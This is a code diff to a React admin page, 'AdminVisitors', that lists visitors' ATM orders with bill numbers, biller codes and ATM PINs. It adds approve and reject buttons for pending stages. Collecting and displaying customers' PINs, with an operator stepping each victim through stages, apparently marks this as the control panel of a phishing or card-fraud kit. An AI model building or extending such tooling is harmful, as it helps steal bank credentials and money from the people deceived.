@@ -1548,12 +1548,22 @@ const AdminVisitors = () => {
                           ) : (
                             <div className="space-y-3">
                               {atmOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4">
+                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                   <div className="grid grid-cols-2 gap-2">
                                     {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
                                     {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
                                     {order.atm_pin && <InfoItem label="الرقم السري" value={order.atm_pin} />}
                                   </div>
+                                  {order.stage_status === "pending" && (
+                                    <div className="flex items-center gap-2 pt-2 border-t border-border/50">
+                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
+                                      </Button>
+                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
+                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                      </Button>
+                                    </div>
+                                  )}
                                 </div>
                               ))}
                             </div>
